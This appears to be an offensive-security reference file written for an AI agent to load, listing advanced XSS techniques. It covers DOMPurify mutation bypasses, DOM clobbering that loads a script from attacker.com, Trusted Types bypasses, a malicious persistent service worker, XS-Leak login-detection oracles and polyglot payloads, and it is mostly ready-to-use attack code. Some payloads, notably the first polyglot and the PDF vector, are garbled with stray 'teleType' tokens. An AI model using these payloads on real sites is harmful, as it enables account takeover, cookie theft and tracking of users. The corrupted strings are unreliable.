# Advanced XSS Tricks — Supplementary Reference

> **Load trigger**: When the agent needs modern framework XSS, mXSS, DOM Clobbering, Trusted Types bypass, or Service Worker persistence techniques beyond the core SKILL.md.

## 1. mXSS (Mutation XSS)

Browser HTML parser "fixes" markup differently than sanitizers expect, causing benign-looking HTML to mutate into executable payloads after DOM insertion.

### Core Mechanism
Sanitizer parses HTML → produces safe output → browser re-parses during `innerHTML` assignment → mutation creates executable node.

### DOMPurify Bypass Patterns

**Namespace confusion (SVG/MathML → HTML back-context):**
```html
<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img src=1 onerror=alert(1)&gt;">
```
Parser treats content as MathML, but browser switches to HTML integration point inside `<mtext>`, causing `<img>` to become executable.

**`<noscript>` parsing differential:**
```html
<noscript><style></noscript><img src=x onerror=alert(1)>
```
DOMPurify (scripting enabled) sees `<style>` consuming the rest. Browser with `scripting=false` context sees the `<img>` as a sibling.

**Form/table restructuring:**
```html
<form><math><mtext></form><form><mglyph><svg><mpath><set attributeName=onmouseover to=alert(1)>
```
Browser tree builder auto-closes first form and restructures, creating unexpected live elements.

### Key Principle
Test with: sanitizer output → `element.innerHTML = sanitized` → inspect actual DOM. If DOM differs from sanitizer's expected tree, mutation XSS is possible.

---

## 2. DOM Clobbering

Override JavaScript variables/properties by injecting HTML elements with specific `id` or `name` attributes.

### Basic Clobbering
```html
<!-- Clobber window.x -->
<img id=x>
<!-- Now window.x === the <img> element -->

<!-- Clobber nested: window.x.y -->
<form id=x><img id=y></form>
<!-- window.x.y === the <img> element -->

<!-- Clobber window.x.y via <a> href (toString = href) -->
<a id=x href="javascript:alert(1)">
<!-- String(window.x) === "javascript:alert(1)" -->
```

### HTMLCollection Clobbering (array-like)
```html
<a id=x>1</a><a id=x>2</a>
<!-- window.x is HTMLCollection [a, a] -->
<!-- window.x[0], window.x[1] accessible -->
```

### Deep Property Clobbering (3+ levels)
```html
<form id=x name=y><input id=z></form>
<!-- document.x.y.z exists -->
```

### Exploit Patterns
If code does `if (window.config) { url = window.config.url; }` and `config` is not defined:
```html
<a id=config href="https://attacker.com/evil.js">
```
Code now loads attacker-controlled URL.

### Defense Check
Code using `typeof x !== 'undefined'` or `x instanceof Object` can sometimes be bypassed because DOM elements are objects.

---

## 3. Modern Framework XSS

### React
- `dangerouslySetInnerHTML={{__html: userInput}}` — direct XSS if userInput is unsanitized
- `href={userInput}` on `<a>` — `javascript:` protocol not blocked by React
- SSR hydration mismatch — server renders different HTML than client expects, dangling markup possible
- `eval()` in `useEffect` with user data

### Vue.js
- `v-html="userInput"` — equivalent to innerHTML, no sanitization
- Server-side template injection via `{{ }}` in SSR mode
- `v-bind:href` / `:href` accepts `javascript:` URIs
- Component `is` attribute with user input → dynamic component injection

### Angular
- `bypassSecurityTrustHtml()` / `bypassSecurityTrustUrl()` — explicit trust marking
- Angular Universal SSR template injection
- `[innerHTML]` binding with bypassed sanitizer
- Older Angular.js (1.x) sandbox escapes still relevant for legacy apps:
```
{{constructor.constructor('alert(1)')()}}
{{'a]'.constructor.prototype.charAt=[].join;$eval('x=1}alert(1)//')}}
```

### Next.js / Nuxt
- `getServerSideProps` returning unsanitized data rendered with `dangerouslySetInnerHTML`
- API routes reflecting input without encoding
- `_document.js` custom head injection

---

## 4. Trusted Types Bypass

Trusted Types enforce that DOM XSS sinks only accept typed objects, not raw strings. Bypass requires finding a policy or sink gap.

### Finding Bypass Vectors
1. **Default policy exists** — look for `trustedTypes.createPolicy('default', ...)` with weak sanitization
2. **Policy with passthrough** — `createHTML: (s) => s` effectively disables protection
3. **Sinks not covered by TT** — `document.cookie`, `window.name`, `location.href` (navigation sinks)
4. **`eval` type policies** — if `createScript` is permissive
5. **DOM clobbering to override policy name** — clobber `trustedTypes` if checked loosely

### Non-TT-Protected Sinks
```javascript
window.name = payload;       // persists across navigations
document.cookie = payload;   // cookie injection
location.href = payload;     // navigation-based XSS
location.hash = payload;     // fragment injection
window.open(payload);        // popup with javascript:
```

### Policy Abuse
```javascript
// If a policy does basic tag stripping but misses event handlers:
const p = trustedTypes.createPolicy('sanitize', {
  createHTML: s => s.replace(/<script>/gi, '')
});
// Bypass: <img onerror=alert(1) src=x>
```

---

## 5. Service Worker XSS Persistence

### Registering Malicious Service Worker
If XSS allows script execution and the scope allows SW registration:
```javascript
navigator.serviceWorker.register('/sw.js', {scope: '/'})
```

### Self-Contained SW via importScripts
```javascript
// If you control a JS file or can inject via upload:
self.addEventListener('fetch', e => {
  if (e.request.url.includes('/target-page')) {
    e.respondWith(new Response('<script>alert(document.cookie)</script>', 
      {headers: {'Content-Type': 'text/html'}}));
  }
});
```

### Persistence Value
- SW persists after XSS payload is cleaned/patched
- Intercepts all fetch requests within scope
- Can inject into every page load until SW is unregistered
- Survives page refresh, tab close/reopen

### Requirements
- HTTPS (or localhost)
- SW script must be served from same origin with valid JS content-type
- Scope restricted to SW script's directory and below

---

## 6. PDF/SVG/XML XSS Vectors

### PDF XSS (Adobe reader in browser)
```
/page.pdf#a]%0d/teleType(alert(1))%0d[/a
```

### SVG Polyglot
```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject>
    <body xmlns="http://www.w3.org/1999/xhtml">
      <script>alert(1)</script>
    </body>
  </foreignObject>
</svg>
```

### SVG `<use>` External Reference
```html
<svg><use href="https://attacker.com/evil.svg#xss"></use></svg>
```

### MathML XSS
```html
<math><maction actiontype="statusline#" xlink:href="javascript:alert(1)">click</maction></math>
```

---

## 7. XS-Leaks & Side Channels (Advanced)

### Timing-Based Detection
```javascript
// Detect if user is logged in to target site
let t0 = performance.now();
fetch('https://target.com/api/me', {mode: 'no-cors'});
let t1 = performance.now();
// Authenticated responses are larger/slower → timing oracle
```

### Frame Counting
```javascript
let w = window.open('https://target.com/search?q=SECRET');
setTimeout(() => {
  // w.length = number of iframes in response
  // Different result count → different frame count → oracle
  console.log(w.length);
}, 2000);
```

### Error Event Oracle
```javascript
// Image loads successfully only for authenticated users
let img = new Image();
img.onload = () => { /* user is logged in */ };
img.onerror = () => { /* user is not logged in */ };
img.src = 'https://target.com/avatar.png';
```

### Cache Probing
```javascript
// Check if resource is cached (= user visited target page)
let t0 = performance.now();
fetch('https://target.com/static/logo.png', {cache: 'force-cache', mode: 'no-cors'});
let t1 = performance.now();
// Cached: fast. Not cached: slow.
```

---

## 8. Polyglot XSS Payloads

Single payloads that work across multiple contexts:

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%%0teleType%0teleType1teleType22teleType33teleType44teleType55teleType66teleType77[7teleType]teleType8teleType9teleType0teleType/teleType*'teleType"*/
</teleType>%0teleType<teleType>alert(1)</teleType>

javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*<svg/*/onload=alert()//>

-->'"/></sCript><dETAILS/+/teleType/+=teleType/OnToggle=alert()>

'"-->]]>*/</script></style></title></textarea><!--<p class="--><img src=x onerror=alert()>">
```

---

## 9. Browser-Specific Tricks

### Chrome-Specific
- `<svg><animate onbegin=alert(1) attributeName=x dur=1s>` — animation event
- Blink-specific parsing in `<template>` content

### Firefox-Specific  
- `<math><mrow xlink:type="simple" xlink:href="javascript:alert(1)">click</mrow></math>`
- `-moz-binding` CSS (deprecated but sometimes present in legacy)

### Safari-Specific
- `<input onfocus=alert(1) autofocus type=search incremental=true>`
- WebKit-specific `<marquee>` event handlers
